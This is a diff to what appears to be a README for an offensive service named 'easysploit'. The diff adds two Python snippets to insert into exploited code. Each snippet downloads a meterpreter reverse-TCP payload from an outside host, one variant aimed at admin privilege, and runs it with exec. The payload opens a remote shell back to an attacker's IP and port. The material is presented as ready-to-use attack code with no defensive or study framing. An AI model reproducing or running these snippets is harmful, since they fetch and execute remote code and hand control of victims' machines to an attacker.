@@ -30,3 +30,16 @@ Both endpoints require the same JSON payload:
   "LPORT": Attacker's listening port
 }
 ```
+
+## Example Code
+Insert this code where you gonna exploit.
+1. **Standard python Reverse TCP Payload**
+```
+import urllib.request, json
+exec(urllib.request.urlopen(urllib.request.Request("https://easysploit.rocknroll17.com/python/meterpreter/reverse_tcp", data=json.dumps({"LHOST": "Attacker's IP", "LPORT": Attacker's listening port}).encode(), headers={'Content-Type': 'application/json'})).read().decode())
+```
+2. **Admin Privilege Reverse TCP Payload**
+```
+import urllib.request, json
+exec(urllib.request.urlopen(urllib.request.Request("https://easysploit.rocknroll17.com/python/meterpreter/reverse_tcp/admin", data=json.dumps({"LHOST": "Attacker's IP", "LPORT": Attacker's listening port}).encode(), headers={'Content-Type': 'application/json'})).read().decode())
+```
